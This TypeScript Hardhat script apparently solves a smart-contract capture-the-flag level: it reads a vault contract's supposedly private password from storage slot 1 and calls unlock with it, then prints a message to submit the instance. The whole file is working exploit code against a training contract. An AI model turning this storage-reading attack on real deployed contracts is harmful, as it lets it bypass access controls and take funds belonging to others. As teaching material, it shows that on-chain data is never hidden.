import { fail } from "assert";
import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

const SLOT = 1;

async function vaultExploit() {
  const vaultAddress = process.env.VAULT_ADDRESS || fail("VAULT_ADDRESS Not Found In .env");
  const [attacker] = await ethers.getSigners();
  const vault = await ethers.getContractAt("Vault", vaultAddress);

  // Password is stored at slot number 1. Get value st storage slot number 1
  const password = await attacker.provider?.getStorageAt(vaultAddress, SLOT);

  // Unlock the vault using password
  const tx = await vault.connect(attacker).unlock(password!);
  if (ethers.provider.network.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
  await tx.wait();

  console.log(`SUCCESS!!! Submit the instance.`);
}

vaultExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
